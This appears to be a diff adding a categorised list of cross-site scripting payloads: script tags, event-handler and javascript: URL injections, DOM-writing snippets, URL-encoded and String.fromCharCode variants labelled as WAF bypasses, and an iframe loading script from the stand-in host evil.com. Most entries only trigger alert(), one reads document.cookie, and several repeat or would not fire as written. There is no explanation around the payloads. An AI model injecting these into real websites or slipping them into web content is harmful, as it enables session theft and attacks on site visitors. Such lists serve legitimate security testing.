@@ -1,0 +1,100 @@
+# ------------------------------
+# Basic XSS Payloads
+# ------------------------------
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<body onload=alert('XSS')>
+<a href="javascript:alert('XSS')">Click me</a>
+<svg><script>alert('XSS')</script></svg>
+<math><mtext onload="alert('XSS')">XSS</mtext></math>
+<svg/onload=alert('XSS')>
+<embed src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<video><source onerror="alert('XSS')" src="x"></video>
+<audio onerror="alert('XSS')"></audio>
+<details open><summary onclick="alert('XSS')">XSS</summary></details>
+<area shape="rect" coords="0,0,10,10" href="javascript:alert('XSS')" />
+
+# ------------------------------
+# Reflected XSS Payloads
+# ------------------------------
+<script>alert(document.cookie)</script>
+<script>alert(location)</script>
+<script>alert(1+1)</script>
+<script>eval('alert("XSS")')</script>
+<script>document.write("<img src='x' onerror='alert(1)' />")</script>
+<svg/onload="alert('XSS')">
+<a href="javascript:alert('XSS')">Click Here</a>
+<form action="javascript:alert('XSS')"></form>
+<iframe src="javascript:alert('XSS')"></iframe>
+<img src="x" onerror="alert('XSS')" />
+<video><source onerror="alert('XSS')" src="x"></video>
+
+# ------------------------------
+# DOM-Based XSS Payloads
+# ------------------------------
+<script>document.body.innerHTML = "<img src=x onerror=alert('XSS')>"</script>
+<script>document.body.innerHTML = "<a href=javascript:alert('XSS')>click</a>"</script>
+<script>document.location="javascript:alert('XSS')" </script>
+<script>window.location.href="javascript:alert('XSS')" </script>
+<script>location.replace("javascript:alert('XSS')")</script>
+<script>document.write('<script>alert("XSS")</script>');</script>
+<script>window.top.location='javascript:alert("XSS")';</script>
+
+# ------------------------------
+# Image and Other Media-based Payloads
+# ------------------------------
+<img src="x" onerror="alert('XSS')" />
+<video><source onerror="alert('XSS')" src="x"></video>
+<audio onerror="alert('XSS')"></audio>
+<embed src="javascript:alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+
+# ------------------------------
+# WAF Bypass Techniques
+# ------------------------------
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>
+<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>
+%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E
+
+# ------------------------------
+# Encoded XSS Payloads
+# ------------------------------
+%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E
+%3Csvg%20onload%3Dalert('XSS')%3E
+%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E
+%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E
+%3Caudio%20onerror%3Dalert('XSS')%3E
+%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E
+
+# ------------------------------
+# XSS Bypass Through Event Handlers
+# ------------------------------
+<input onfocus="alert('XSS')" autofocus>
+<img src="x" onerror="alert(1)">
+<a href="javascript:alert('XSS')">Click me</a>
+<button onclick="alert('XSS')">Click me</button>
+<input type="button" value="Click me" onclick="alert('XSS')">
+<textarea onfocus="alert('XSS')">Test</textarea>
+
+# ------------------------------
+# XSS Payloads With Dynamic Content
+# ------------------------------
+<script>window['eval']('alert("XSS")')</script>
+<script>window['setInterval']('alert("XSS")', 1000)</script>
+<script>window['setTimeout']('alert("XSS")', 1000)</script>
+<script>document.getElementById('myElem').innerHTML = '<img src="x" onerror="alert(1)" />'</script>
+<script>document.getElementById('myElem').innerHTML = "<script>alert('XSS')</script>"</script>
+
+# ------------------------------
+# Cross-Domain XSS Payloads
+# ------------------------------
+<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>
+<iframe src="http://evil.com/evil.js"></iframe>
+<frame src="javascript:alert('XSS')"></frame>
